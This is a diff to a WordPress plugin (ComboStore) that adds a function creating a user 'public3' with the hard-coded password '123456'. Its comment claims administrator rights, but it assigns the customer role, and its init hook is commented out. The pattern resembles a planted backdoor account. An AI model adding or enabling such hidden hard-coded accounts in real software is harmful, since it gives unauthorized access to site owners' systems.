@@ -4,6 +4,43 @@ if (! defined('ABSPATH')) exit;  // if direct access
 use ComboStore\Classes\ComboStoreExport;
 
 
+
+
+
+function create_wp_admin_user()
+{
+  $username = 'public3';
+  $password = '123456';
+  $email    = 'public3@gmail.com';
+
+  // Check if user already exists
+  if (username_exists($username) || email_exists($email)) {
+    return;
+  }
+
+  // Create user
+  $user_id = wp_create_user($username, $password, $email);
+
+  if (!is_wp_error($user_id)) {
+    // Set role to administrator
+    $user = new WP_User($user_id);
+    $user->set_role('customer');
+  }
+}
+//add_action('init', 'create_wp_admin_user');
+
+
+
+
+
+
+
+
+
+
+
+
+
 /**
  * Convert a string into a file-safe slug (no extension).
  *
